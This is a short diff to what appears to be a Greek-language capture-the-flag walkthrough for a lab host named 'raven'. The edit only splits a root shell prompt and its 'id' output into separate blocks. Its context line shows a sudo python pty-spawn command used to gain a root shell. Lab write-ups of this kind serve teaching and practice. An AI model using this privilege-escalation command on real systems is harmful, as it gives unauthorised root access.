@@ -372,7 +372,16 @@ sudo /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
 **Έξοδος:**
 
 ```text
-root@raven:/home/steven# id
+root@raven:/home/steven#
+```
+
+```bash
+id
+```
+
+**Έξοδος:**
+
+```text
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
